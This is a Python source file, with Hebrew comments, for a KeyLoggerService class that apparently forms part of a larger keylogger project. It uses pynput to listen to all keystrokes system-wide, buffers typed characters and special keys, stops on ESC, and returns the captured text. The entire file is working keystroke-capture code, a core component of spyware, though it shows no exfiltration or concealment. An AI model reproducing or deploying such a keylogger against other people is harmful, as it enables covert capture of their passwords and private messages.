from pynput import keyboard
from IKeyLogger import IKeyLogger
import time

class KeyLoggerService(IKeyLogger):
    def __init__(self, on_escape_callback=None):
        self.buffer = []
        self.listener = None
        self.on_escape_callback=on_escape_callback
    def _on_press(self, key):
        try:
            # תו רגיל
            self.buffer += key.char

        except AttributeError:
            print(key)
            # מקשים מיוחדים (כמו Enter, Space)
            if key == keyboard.Key.space:
                self.buffer.append( " ")
            elif key == keyboard.Key.enter:
                self.buffer.append( "\n")
            elif key == keyboard.Key.esc:  # עצירה בלחיצה על ESC
                if self.on_escape_callback:
                    self.on_escape_callback()
                return False
            else:
                self.buffer.append(key.name)

    def start_logging(self) -> None:
        if not self.listener:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()

    def stop_logging(self) -> None:
        if self.listener:
            self.listener.stop()
            self.listener = None

    def get_logged_keys(self) -> list:
        temp = " ".join(self.buffer)
        self.buffer =[]
        return temp
